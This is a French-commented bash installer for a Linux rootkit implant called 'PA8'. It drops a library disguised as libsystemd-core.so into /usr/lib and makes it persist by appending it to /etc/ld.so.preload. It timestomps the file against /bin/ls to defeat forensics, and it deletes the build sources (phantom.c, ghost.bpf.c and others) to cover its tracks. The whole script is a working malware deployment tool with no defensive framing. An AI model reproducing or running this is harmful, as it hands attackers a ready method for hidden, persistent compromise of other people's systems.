#!/bin/bash
set -e

# Configuration
MALWARE_NAME="libsystemd-core.so"
TARGET_DIR="/usr/lib"
TARGET_PATH="$TARGET_DIR/$MALWARE_NAME"
PRELOAD_FILE="/etc/ld.so.preload"

echo "[*] Installation de l'implant PA8 (V9)..."

# 1. Nettoyage préventif (Pour éviter les doublons ou crashs)
# On vide le preload s'il existe pour arrêter l'ancien malware s'il bug
[ -f $PRELOAD_FILE ] && > $PRELOAD_FILE
rm -f $TARGET_PATH

# 2. Copie du fichier
cp $MALWARE_NAME $TARGET_PATH

# 3. PERMISSIONS (CRITIQUE) : Tout le monde doit pouvoir le lire
# C'est souvent ça qui fait échouer le chargement silencieusement
chmod 755 $TARGET_PATH
chown root:root $TARGET_PATH

# 4. Timestomping (Anti-Forensic)
# Le fichier aura l'air aussi vieux que /bin/ls
touch -r /bin/ls $TARGET_PATH

# 5. Injection Persistante
echo "[*] Activation de l'injection..."
# On crée le fichier s'il n'existe pas
touch $PRELOAD_FILE
# On injecte seulement si pas déjà présent
if ! grep -q "$TARGET_PATH" $PRELOAD_FILE; then
    echo "" >> $PRELOAD_FILE
    echo "$TARGET_PATH" >> $PRELOAD_FILE
fi

echo "[*] Nettoyage des traces locales..."
# On supprime les sources pour ne laisser que le binaire caché
rm -rf builder.sh phantom.c ghost.bpf.c ghost.skel.h config.h vmlinux.h openssl-static deploy.sh

echo "[+] Terminé. Le fantôme est actif."
echo "[+] Vérifiez avec 'ls -l $TARGET_PATH' -> Il ne devrait PAS apparaître."
